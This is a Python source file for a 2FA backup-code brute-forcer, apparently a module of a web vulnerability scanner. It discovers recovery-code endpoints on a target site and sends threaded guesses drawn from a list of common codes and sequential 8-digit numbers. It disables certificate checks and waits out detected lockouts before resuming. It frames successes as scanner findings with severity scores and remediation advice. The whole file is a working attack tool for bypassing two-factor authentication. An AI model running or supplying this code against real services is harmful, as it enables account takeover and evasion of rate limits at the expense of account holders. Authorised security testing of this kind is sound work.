#!/usr/bin/env python3
"""
2FA Backup Code Enumerator — Senior Level
------------------------------------------
Brute-forces 2FA backup recovery codes via:
  • 6-8 digit numeric codes (10^6 - 10^8 combinations)
  • Alphanumeric backup codes (xxxx-xxxx format)
  • Sequential and dictionary-based patterns
  • Rate limit / lockout detection
  • Concurrent threading with automatic backoff
"""

import time
import itertools
import string
import requests
import concurrent.futures
from typing import List, Dict, Optional
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

console = Console()

# Common backup code endpoints
BACKUP_CODE_PATHS = [
    "/account/backup-codes/verify",
    "/auth/backup-code",
    "/2fa/recovery",
    "/account/recovery-code",
    "/login/recovery",
    "/security/backup-code",
    "/api/auth/recovery",
    "/verify/backup",
]


# Common backup code formats to try
def gen_numeric_codes(digits: int = 8):
    """Generate all N-digit numeric codes."""
    for i in range(10**digits):
        yield str(i).zfill(digits)


def gen_hyphenated_codes(length: int = 4, groups: int = 2):
    """Generate xxxx-xxxx style codes (alphanumeric)."""
    chars = string.ascii_lowercase + string.digits
    # Sample from space — not exhaustive (too large), use common patterns
    patterns = [
        "aaaa-aaaa",
        "1234-5678",
        "abcd-1234",
    ]
    # Yield common format samples + random samples
    import random

    for _ in range(500):
        yield "-".join("".join(random.choices(chars, k=length)) for _ in range(groups))


COMMON_BACKUP_CODES = [
    "00000000",
    "11111111",
    "12345678",
    "87654321",
    "99999999",
    "00000001",
    "11223344",
    "12121212",
    "88888888",
    "00001111",
    "backup01",
    "recover1",
    "reset001",
]


class BackupCodeEnumerator:
    """
    Senior-level 2FA backup code brute-forcer.
    Detects lockout after N failures and backs off automatically.
    """

    def __init__(
        self,
        target: str,
        session=None,
        timeout: int = 10,
        threads: int = 5,
        max_attempts: int = 500,
        field_name: str = "backup_code",
    ):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.threads = threads
        self.max_attempts = max_attempts
        self.field_name = field_name
        self.session = session or requests.Session()
        self.session.verify = False
        self.results: List[Dict] = []
        self._stop = False
        self._attempts = 0
        self._lockout_detected = False

    def _try_code(self, endpoint: str, code: str) -> Optional[Dict]:
        if self._stop:
            return None
        self._attempts += 1

        try:
            resp = self.session.post(
                endpoint,
                data={self.field_name: code, "code": code, "recovery_code": code},
                timeout=self.timeout,
                verify=False,
                allow_redirects=False,
            )
        except Exception:
            return None

        if not resp:
            return None

        body = resp.text.lower()

        # Lockout / rate limit detection
        if any(
            s in body
            for s in ["too many", "locked", "rate limit", "blocked", "try again later"]
        ):
            if not self._lockout_detected:
                self._lockout_detected = True
                console.print(
                    f"  [bold yellow]⚠ Lockout detected at attempt {self._attempts} — backing off 30s[/bold yellow]"
                )
            time.sleep(30)
            return None

        # Success signals
        if resp.status_code in (200, 302):
            loc = resp.headers.get("Location", "")
            if any(s in loc for s in ["dashboard", "home", "account", "profile"]):
                self._stop = True
                return {
                    "url": endpoint,
                    "type": "2FA Backup Code — Brute-force Success",
                    "severity": "critical",
                    "cvss": 9.8,
                    "detail": f"Backup code '{code}' accepted. Full account takeover possible.",
                    "evidence": f"Redirect to: {loc}",
                    "owasp": "A07:2021 – Identification and Authentication Failures",
                    "remediation": "Limit backup code attempts to 5. Implement exponential backoff. Invalidate codes after use.",
                }
            # No redirect but success keyword
            if any(s in body for s in ["success", "verified", "welcome", "logged in"]):
                self._stop = True
                return {
                    "url": endpoint,
                    "type": "2FA Backup Code — Brute-force Success",
                    "severity": "critical",
                    "cvss": 9.8,
                    "detail": f"Backup code '{code}' accepted. Full account takeover possible.",
                    "evidence": f"HTTP 200 with success keyword.",
                    "owasp": "A07:2021 – Identification and Authentication Failures",
                    "remediation": "Limit backup code attempts to 5 total with account lockout.",
                }

        # No lockout at all = vulnerability even without finding code
        if self._attempts == 50 and not self._lockout_detected:
            self.results.append(
                {
                    "url": endpoint,
                    "type": "2FA Backup Code — No Rate Limiting Detected",
                    "severity": "high",
                    "cvss": 7.5,
                    "detail": "50 backup code attempts accepted without lockout. Brute-force is feasible.",
                    "evidence": f"50 requests, no lockout. HTTP responses: {resp.status_code}",
                    "owasp": "A07:2021 – Identification and Authentication Failures",
                    "remediation": "Enforce strict rate limiting (5 attempts max) on backup code verification endpoints.",
                }
            )
        return None

    def _discover_endpoint(self) -> Optional[str]:
        for path in BACKUP_CODE_PATHS:
            url = self.target + path
            try:
                r = self.session.get(url, timeout=5, verify=False)
                if r and r.status_code not in (404,):
                    console.print(
                        f"  [green]Backup code endpoint found: {path}[/green]"
                    )
                    return url
            except Exception:
                pass
        return None

    def run(self) -> List[Dict]:
        console.print(
            f"\n  [bold yellow]▶ 2FA Backup Code Enumerator on {self.target}[/bold yellow]"
        )

        endpoint = self._discover_endpoint()
        if not endpoint:
            console.print("  [dim]No backup code endpoint detected[/dim]")
            return []

        # Build code list: common first, then numeric
        code_list = list(COMMON_BACKUP_CODES)
        for i, code in enumerate(gen_numeric_codes(8)):
            if i >= self.max_attempts - len(COMMON_BACKUP_CODES):
                break
            code_list.append(code)

        console.print(
            f"  [dim]Testing {len(code_list)} backup codes against {endpoint}[/dim]"
        )

        with Progress(
            SpinnerColumn(),
            TextColumn("[cyan]Enumerating backup codes...[/cyan]"),
            BarColumn(),
            console=console,
        ) as prog:
            task = prog.add_task("backup", total=len(code_list))

            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as ex:
                futures = {ex.submit(self._try_code, endpoint, c): c for c in code_list}
                for future in concurrent.futures.as_completed(futures):
                    prog.advance(task)
                    if self._stop:
                        ex.shutdown(wait=False, cancel_futures=True)
                        break
                    r = future.result()
                    if r:
                        self.results.append(r)
                        console.print(f"  [bold red]🔥 {r['type']}[/bold red]")

        color = "red" if self.results else "green"
        console.print(f"  [{color}]{len(self.results)} backup code issue(s) found[/]")
        return self.results
